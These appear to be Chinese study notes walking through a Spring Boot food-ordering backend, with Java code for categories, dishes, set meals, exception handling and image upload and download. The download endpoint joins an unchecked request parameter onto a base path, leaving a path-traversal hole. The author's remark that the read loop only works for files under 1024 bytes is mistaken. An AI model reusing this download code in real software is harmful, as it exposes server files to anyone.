<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyMetaObjecthandler</span> <span class="keyword">implements</span> <span class="title class_">MetaObjectHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertFill</span><span class="params">(MetaObject metaObject)</span> &#123;</span><br><span class="line"><span class="comment">//        log.info(&quot;自动填充&quot;);</span></span><br><span class="line"><span class="comment">//        log.info(metaObject.toString());</span></span><br><span class="line">        metaObject.setValue(<span class="string">&quot;createTime&quot;</span>, LocalDateTime.now());</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;updateTime&quot;</span>, LocalDateTime.now());</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;createUser&quot;</span>, BaseContext.getCurrentId());</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;updateUser&quot;</span>, BaseContext.getCurrentId());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateFill</span><span class="params">(MetaObject metaObject)</span> &#123;</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;updateTime&quot;</span>, LocalDateTime.now());</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;updateUser&quot;</span>, BaseContext.getCurrentId());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分类管理业务-新增分类"><a href="#分类管理业务-新增分类" class="headerlink" title="分类管理业务-新增分类"></a>分类管理业务-新增分类</h3><p>在开发业务功能前，先将需要用到的类和接口基本结构创建好:<br>实体类Category(直接从课程资料中导入即可)<br>Mapper接口CategoryMapper<br>业务层接口CategoryService<br>业务层实现类CategoryServicelmpl<br>控制层CategoryGontroller</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/category&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CategoryController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CategoryService categoryService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="keyword">public</span> R&lt;String&gt; <span class="title function_">save</span><span class="params">(<span class="meta">@RequestBody</span> Category category)</span>&#123;</span><br><span class="line">        categoryService.save(category);</span><br><span class="line">        <span class="keyword">return</span> R.success(<span class="string">&quot;新增分类成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分类管理业务-分类分页查询"><a href="#分类管理业务-分类分页查询" class="headerlink" title="分类管理业务-分类分页查询"></a>分类管理业务-分类分页查询</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/page&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R&lt;Page&gt; <span class="title function_">page</span><span class="params">(<span class="type">int</span> page, <span class="type">int</span> pageSize, String name)</span>&#123;</span><br><span class="line">    log.info(<span class="string">&quot;page=&#123;&#125;,pageSize=&#123;&#125;,name=&#123;&#125;&quot;</span>,page, pageSize, name);</span><br><span class="line">    Page&lt;Category&gt; pageInfo = <span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(page, pageSize);</span><br><span class="line">    LambdaQueryWrapper&lt;Category&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">    queryWrapper.orderByAsc(Category::getSort);</span><br><span class="line">    categoryService.page(pageInfo,queryWrapper);</span><br><span class="line">    <span class="keyword">return</span> R.success(pageInfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分类管理业务-删除分类"><a href="#分类管理业务-删除分类" class="headerlink" title="分类管理业务-删除分类"></a>分类管理业务-删除分类</h3><p>在分类管理列表页面，可以对某个分类进行删除操作。需要注意的是当分类关联了菜品或者套餐时，此分类不允许删除。</p>
<p>终于在service写逻辑了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@DeleteMapping</span></span><br><span class="line"><span class="keyword">public</span> R&lt;String&gt; <span class="title function_">delete</span><span class="params">(Long ids)</span>&#123;</span><br><span class="line">    categoryService.remove(ids);</span><br><span class="line">    <span class="keyword">return</span> R.success(<span class="string">&quot;分类信息删除成功&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>service和impl代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CategoryService</span> <span class="keyword">extends</span> <span class="title class_">IService</span>&lt;Category&gt; &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Long id)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CategoryServiceImp</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;CategoryMapper, Category&gt; <span class="keyword">implements</span> <span class="title class_">CategoryService</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> DishService dishService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> SetmealService setmealService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">        LambdaQueryWrapper&lt;Dish&gt;  dishLambdaQueryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">        dishLambdaQueryWrapper.eq(Dish::getCategoryId, id);</span><br><span class="line">        <span class="type">int</span> <span class="variable">dishCount</span> <span class="operator">=</span> dishService.count(dishLambdaQueryWrapper);</span><br><span class="line">        <span class="keyword">if</span>(dishCount &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CustomException</span>(<span class="string">&quot;当前分类下关联了菜品,不能删除&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        LambdaQueryWrapper&lt;Setmeal&gt; setmealLambdaQueryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">        setmealLambdaQueryWrapper.eq(Setmeal::getCategoryId, id);</span><br><span class="line">        <span class="type">int</span> <span class="variable">setmealCount</span> <span class="operator">=</span> setmealService.count(setmealLambdaQueryWrapper);</span><br><span class="line">        <span class="keyword">if</span>(setmealCount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CustomException</span>(<span class="string">&quot;当前分类下关联了套餐,不能删除&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">super</span>.removeById(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>异常类代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomException</span> <span class="keyword">extends</span> <span class="title class_">RuntimeException</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CustomException</span><span class="params">(String message)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>全局异常处理器对应代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ExceptionHandler(CustomException.class)</span></span><br><span class="line"><span class="keyword">public</span> R&lt;String&gt; <span class="title function_">ExceptionHandler</span><span class="params">(CustomException ex)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> R.error(ex.getMessage());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/feyehong/article/details/131028588">SpringBoot 增强Controller方法，@ControllerAdvice注解的使用-CSDN博客</a></p>
<h3 id="分类管理业务-更新分类"><a href="#分类管理业务-更新分类" class="headerlink" title="分类管理业务-更新分类"></a>分类管理业务-更新分类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PutMapping</span></span><br><span class="line"><span class="keyword">public</span> R&lt;String&gt; <span class="title function_">update</span><span class="params">(<span class="meta">@RequestBody</span> Category category)</span>&#123;</span><br><span class="line">    categoryService.updateById(category);</span><br><span class="line">    <span class="keyword">return</span> R.success(<span class="string">&quot;更新成功&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="文件上传下载"><a href="#文件上传下载" class="headerlink" title="文件上传下载"></a>文件上传下载</h3><p>上传</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/common&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonController</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;reggie.path&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String basePath;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/upload&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R&lt;String&gt; <span class="title function_">upload</span><span class="params">(MultipartFile file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">originalFilename</span> <span class="operator">=</span> file.getOriginalFilename();</span><br><span class="line">        <span class="type">String</span> <span class="variable">suffix</span> <span class="operator">=</span> originalFilename.substring(originalFilename.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> UUID.randomUUID().toString() + suffix;</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(basePath);</span><br><span class="line">        <span class="keyword">if</span>(!dir.exists())&#123;</span><br><span class="line">            dir.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            file. transferTo(<span class="keyword">new</span> <span class="title class_">File</span>(basePath + filename));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"><span class="comment">//            throw new RuntimeException(e);</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> R.error(<span class="string">&quot;上传失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> R.success(filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>todo：保存文件路径写死的，最好可以保存在jar包所在目录下的static&#x2F;img 下，或者保存在资源目录下的static&#x2F;img</p>
<p>下载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/download&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">download</span><span class="params">(String name, HttpServletResponse response)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(basePath + name));</span><br><span class="line">        <span class="type">ServletOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">        response.setContentType(<span class="string">&quot;image/jpeg&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len = fileInputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            outputStream.write(bytes, <span class="number">0</span>, len);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">        &#125;</span><br><span class="line">        outputStream.close();</span><br><span class="line">        fileInputStream.close();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实这个写法应该是有问题的，但是因为默认文件大小不超过1024.所有不会导致问题</p>
<h3 id="新增菜品-准备工作"><a href="#新增菜品-准备工作" class="headerlink" title="新增菜品-准备工作"></a>新增菜品-准备工作</h3><p>工作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在开发业务功能前，先将需要用到的类和接口基本结构创建好:</span><br><span class="line">实体类 DishFlavor(直接从课程资料中导入即可，Dish实体前面课程中已经导入过了)</span><br><span class="line">Mapper接口 DishFlavorMapper</span><br><span class="line">业务层接口 DishFlavorService</span><br><span class="line">业务层实现类 DishFlavorServicelmpl</span><br><span class="line">控制层 DishController</span><br></pre></td></tr></table></figure>

<h3 id="新增菜品-查询分类信息"><a href="#新增菜品-查询分类信息" class="headerlink" title="新增菜品-查询分类信息"></a>新增菜品-查询分类信息</h3><p>交互过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在开发代码之前，需要梳理一下新增莱品时前端页面和服务端的交互过程:</span><br><span class="line">1、页面(backend/page/food/add.html)发送ajax请求，请求服务端获取菜品分类数据并展示到下拉框中</span><br><span class="line">2、页面发送请求进行图片上传，请求服务端将图片保存到服务器</span><br><span class="line">3、页面发送请求进行图片下载，将上传的图片进行回显</span><br><span class="line">4、点击保存按钮，发送ajax请求，将菜品相关数据以json形式提交到服务端</span><br><span class="line">开发新增菜品功能，其实就是在服务端编写代码去处理前端页面发送的这4次请求即可。</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/list&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R&lt;List&lt;Category&gt;&gt; <span class="title function_">list</span><span class="params">(Category category)</span>&#123;</span><br><span class="line">    <span class="comment">//条件构造器</span></span><br><span class="line">    LambdaQueryWrapper&lt;Category&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//添加条件</span></span><br><span class="line">    queryWrapper.eq(category.getType() != <span class="literal">null</span>,Category::getType,category.getType());</span><br><span class="line">    <span class="comment">//添加排序条件</span></span><br><span class="line">    queryWrapper.orderByAsc(Category::getSort).orderByDesc(Category::getUpdateTime);</span><br><span class="line"></span><br><span class="line">    List&lt;Category&gt; list = categoryService.list(queryWrapper);</span><br><span class="line">    <span class="keyword">return</span> R.success(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="新增菜品-接收界面提交数据并处理"><a href="#新增菜品-接收界面提交数据并处理" class="headerlink" title="新增菜品-接收界面提交数据并处理"></a>新增菜品-接收界面提交数据并处理</h3><p>新增dto-dishDto(传输得数据跟实体类不是一一对应，得新建dto)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DishDto</span> <span class="keyword">extends</span> <span class="title class_">Dish</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;DishFlavor&gt; flavors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String categoryName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer copies;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应controller代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//DishController.java</span></span><br><span class="line"><span class="meta">@PostMapping</span></span><br><span class="line"><span class="keyword">public</span> R&lt;String&gt; <span class="title function_">save</span><span class="params">(<span class="meta">@RequestBody</span> DishDto dishDto)</span>&#123;</span><br><span class="line">    log.info(dishDto.toString());</span><br><span class="line">    dishService.saveWithFlavor(dishDto);</span><br><span class="line">    <span class="keyword">return</span> R.success(<span class="string">&quot;新增菜品成功&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对应service代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DishServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;DishMapper, Dish&gt; <span class="keyword">implements</span> <span class="title class_">DishService</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> DishFlavorService dishFlavorService;</span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveWithFlavor</span><span class="params">(DishDto dishDto)</span> &#123;</span><br><span class="line">        <span class="comment">//保存菜品的基本信息到菜品表dish</span></span><br><span class="line">        <span class="built_in">this</span>.save(dishDto);</span><br><span class="line"></span><br><span class="line">        <span class="type">Long</span> <span class="variable">dishId</span> <span class="operator">=</span> dishDto.getId();<span class="comment">//菜品id</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//菜品口味</span></span><br><span class="line">        List&lt;DishFlavor&gt; flavors = dishDto.getFlavors();</span><br><span class="line">        flavors = flavors.stream().map((item) -&gt; &#123;</span><br><span class="line">            item.setDishId(dishId);</span><br><span class="line">            <span class="keyword">return</span> item;</span><br><span class="line">        &#125;).collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//保存菜品口味数据到菜品口味表dish_flavor</span></span><br><span class="line">        dishFlavorService.saveBatch(flavors);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">DishService</span> <span class="keyword">extends</span> <span class="title class_">IService</span>&lt;Dish&gt; &#123;</span><br><span class="line">    <span class="comment">//新增菜品，同时插入菜品对应的口味数据，需要操作两张表：dish、dish_flavor</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveWithFlavor</span><span class="params">(DishDto dishDto)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>启动类增加事务注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@ServletComponentScan</span></span><br><span class="line"><span class="meta">@EnableTransactionManagement</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReggieApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(ReggieApplication.class,args);</span><br><span class="line">        log.info(<span class="string">&quot;项目启动成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="菜品信息分页查询"><a href="#菜品信息分页查询" class="headerlink" title="菜品信息分页查询"></a>菜品信息分页查询</h3><p>过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在开发代码之前，需要梳理一下菜品分页查询时前端页面和服务端的交互过程:</span><br><span class="line">1、页面(backend/page/food/list.html)发送ajax请求，将分页查询参数(page、pageSize、name)提交到服务端，获取分贡数据</span><br><span class="line">2、页面发送请求，请求服务端进行图片下载，用于页面图片展示</span><br><span class="line">开发菜品信息分页查询功能，其实就是在服务端编写代码去处理前端页面发送的这2次请求即可。</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> R&lt;Page&gt; <span class="title function_">page</span><span class="params">(<span class="type">int</span> page, <span class="type">int</span> pageSize, String name)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造分页构造器对象</span></span><br><span class="line">    Page&lt;Dish&gt; pageInfo = <span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(page,pageSize);</span><br><span class="line">    Page&lt;DishDto&gt; dishDtoPage = <span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//条件构造器</span></span><br><span class="line">    LambdaQueryWrapper&lt;Dish&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//添加过滤条件</span></span><br><span class="line">    queryWrapper.like(name != <span class="literal">null</span>,Dish::getName,name);</span><br><span class="line">    <span class="comment">//添加排序条件</span></span><br><span class="line">    queryWrapper.orderByDesc(Dish::getUpdateTime);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行分页查询</span></span><br><span class="line">    dishService.page(pageInfo,queryWrapper);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对象拷贝</span></span><br><span class="line">    BeanUtils.copyProperties(pageInfo,dishDtoPage,<span class="string">&quot;records&quot;</span>);</span><br><span class="line"></span><br><span class="line">    List&lt;Dish&gt; records = pageInfo.getRecords();</span><br><span class="line"></span><br><span class="line">    List&lt;DishDto&gt; list = records.stream().map((item) -&gt; &#123;</span><br><span class="line">        <span class="type">DishDto</span> <span class="variable">dishDto</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DishDto</span>();</span><br><span class="line"></span><br><span class="line">        BeanUtils.copyProperties(item,dishDto);</span><br><span class="line"></span><br><span class="line">        <span class="type">Long</span> <span class="variable">categoryId</span> <span class="operator">=</span> item.getCategoryId();<span class="comment">//分类id</span></span><br><span class="line">        <span class="comment">//根据id查询分类对象</span></span><br><span class="line">        <span class="type">Category</span> <span class="variable">category</span> <span class="operator">=</span> categoryService.getById(categoryId);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(category != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">categoryName</span> <span class="operator">=</span> category.getName();</span><br><span class="line">            dishDto.setCategoryName(categoryName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dishDto;</span><br><span class="line">    &#125;).collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line">    dishDtoPage.setRecords(list);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> R.success(dishDtoPage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/qq_39629277/article/details/83108585">Java8新特性Stream之Collectors(toList()、toSet()、toCollection()、joining()、partitioningBy()、collectingAndT)_stream().collect(collectors.toset(-CSDN博客</a></p>
<h3 id="菜品管理-修改菜品"><a href="#菜品管理-修改菜品" class="headerlink" title="菜品管理-修改菜品"></a>菜品管理-修改菜品</h3><p>过程梳理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在开发代码之前，需要梳理一下修改菜品时前端页面(add.html)和服务端的交互过程</span><br><span class="line">1、页面发送ajax请求，请求服务端获取分类数据，用于菜品分类下拉框中数据展示</span><br><span class="line">2、页面发送ajax请求，请求服务端，根据id查询当前菜品信息，用于菜品信息回显</span><br><span class="line">3、页面发送请求，请求服务端进行图片下载，用于页图片回显</span><br><span class="line">4、点击保存按钮，页面发送ajax请求，将修改后的菜品相关数据以json形式提交到服务端</span><br></pre></td></tr></table></figure>

<p>代码</p>
<p>service写个两方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> DishDto <span class="title function_">getByIdWithFlavor</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">    <span class="comment">//查询菜品基本信息，从dish表查询</span></span><br><span class="line">    <span class="type">Dish</span> <span class="variable">dish</span> <span class="operator">=</span> <span class="built_in">this</span>.getById(id);</span><br><span class="line"></span><br><span class="line">    <span class="type">DishDto</span> <span class="variable">dishDto</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DishDto</span>();</span><br><span class="line">    BeanUtils.copyProperties(dish,dishDto);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//查询当前菜品对应的口味信息，从dish_flavor表查询</span></span><br><span class="line">    LambdaQueryWrapper&lt;DishFlavor&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">    queryWrapper.eq(DishFlavor::getDishId,dish.getId());</span><br><span class="line">    List&lt;DishFlavor&gt; flavors = dishFlavorService.list(queryWrapper);</span><br><span class="line">    dishDto.setFlavors(flavors);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dishDto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateWithFlavor</span><span class="params">(DishDto dishDto)</span> &#123;</span><br><span class="line">    <span class="comment">//更新dish表基本信息</span></span><br><span class="line">    <span class="built_in">this</span>.updateById(dishDto);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//清理当前菜品对应口味数据---dish_flavor表的delete操作</span></span><br><span class="line">    LambdaQueryWrapper&lt;DishFlavor&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>();</span><br><span class="line">    queryWrapper.eq(DishFlavor::getDishId,dishDto.getId());</span><br><span class="line"></span><br><span class="line">    dishFlavorService.remove(queryWrapper);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加当前提交过来的口味数据---dish_flavor表的insert操作</span></span><br><span class="line">    List&lt;DishFlavor&gt; flavors = dishDto.getFlavors();</span><br><span class="line"></span><br><span class="line">    flavors = flavors.stream().map((item) -&gt; &#123;</span><br><span class="line">        item.setDishId(dishDto.getId());</span><br><span class="line">        <span class="keyword">return</span> item;</span><br><span class="line">    &#125;).collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line">    dishFlavorService.saveBatch(flavors);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>controller代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R&lt;DishDto&gt; <span class="title function_">get</span><span class="params">(<span class="meta">@PathVariable</span> Long id)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">DishDto</span> <span class="variable">dishDto</span> <span class="operator">=</span> dishService.getByIdWithFlavor(id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> R.success(dishDto);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@PutMapping</span></span><br><span class="line"><span class="keyword">public</span> R&lt;String&gt; <span class="title function_">update</span><span class="params">(<span class="meta">@RequestBody</span> DishDto dishDto)</span>&#123;</span><br><span class="line">    log.info(dishDto.toString());</span><br><span class="line"></span><br><span class="line">    dishService.updateWithFlavor(dishDto);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> R.success(<span class="string">&quot;修改菜品成功&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="新增套餐"><a href="#新增套餐" class="headerlink" title="新增套餐"></a>新增套餐</h3><p>数据模型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">新增套餐，其实就是将新增页而录入的套餐信息插入到setmeal表，还需要向setmeal dish表插入套餐和菜品关联数据所以在新增套餐时，涉及到两个表:</span><br><span class="line">setmeal 套餐表</span><br><span class="line">setmeal_ dish套餐菜品关系表</span><br></pre></td></tr></table></figure>

<p>交互过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1、页面(backend/page/combo/add.html)发送ajax请求，请求服务端获取套餐分类数据并展示到下拉框中</span><br><span class="line">2、页面发送ajax请求，请求服务端获取菜品分类数据并展示到添加菜品窗口中</span><br><span class="line">3、页面发送aiax请求，请求服务端，根据菜品分类查询对应的菜品数据并展示到添加莱品窗口中</span><br><span class="line">4、页面发送请求进行图片上传，请求服务端将图片保存到服务器</span><br><span class="line">5、页面发送请求进行图片下载，将上传的图片进行回显</span><br><span class="line">6、点击保存按钮，发送ajax请求，将套餐相关数据以json形式提交到服务端</span><br></pre></td></tr></table></figure>

<p>代码</p>
<p>controller代码</p>
